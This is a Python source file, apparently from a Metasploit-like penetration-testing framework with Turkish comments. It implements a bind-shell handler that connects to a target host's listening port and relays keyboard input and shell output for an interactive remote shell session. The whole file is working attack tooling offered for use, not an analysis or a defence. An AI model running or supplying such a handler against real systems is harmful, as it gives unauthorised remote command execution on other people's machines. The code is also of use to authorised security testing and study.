from core.handler import BaseHandler
import socket
import sys
import select
from rich import print

class Handler(BaseHandler):
    """
    Python Bind TCP Handler.
    Hedef sistemdeki porta bağlanır ve shell oturumu başlatır.
    """
    def start(self):
        """
        Bind shell için özel start metodu.
        Dinlemek yerine, hedefe (RHOST) bağlanır.
        """
        rhost = self.options.get("RHOST")
        lport = self.lport # Bind shell'de hedef port LPORT olarak geçiyor genelde (veya RPORT?), standart msf'de LPORT kullanılır.
        
        if not rhost:
            print("[!] RHOST belirtilmedi! Bind shell için RHOST gereklidir.")
            return

        print(f"[*] Hedefe bağlanılıyor: {rhost}:{lport}...")
        
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((rhost, lport))
            self.running = True
            print(f"[+] Bağlantı sağlandı!")
            
            # Bağlantı kuruldu, shell oturumunu başlat
            self.handle_connection(self.sock)
            
        except ConnectionRefusedError:
            print(f"[!] Bağlantı reddedildi. Hedef port kapalı olabilir veya henüz açılmamış.")
        except Exception as e:
            print(f"[!] Bağlantı hatası: {e}")
        finally:
            self.stop()

    def handle_connection(self, client_sock, session_id=None):
        print(f"[*] Shell oturumu başlatılıyor... (Session: {session_id})")
        print("-" * 50)
        
        try:
            while True:
                # Select ile stdin ve socket'i dinle
                rlist, _, _ = select.select([client_sock, sys.stdin], [], [])
                
                for r in rlist:
                    if r == client_sock:
                        try:
                            data = client_sock.recv(4096)
                            if not data:
                                print("\n[!] Bağlantı koptu.")
                                return
                            sys.stdout.buffer.write(data)
                            sys.stdout.flush()
                        except:
                            return
                        
                    elif r == sys.stdin:
                        msg = sys.stdin.readline()
                        if not msg: break
                        client_sock.sendall(msg.encode())
                        
        except KeyboardInterrupt:
            print("\n[*] Shell oturumu sonlandırılıyor...")
        except Exception as e:
            print(f"[!] Hata: {e}")
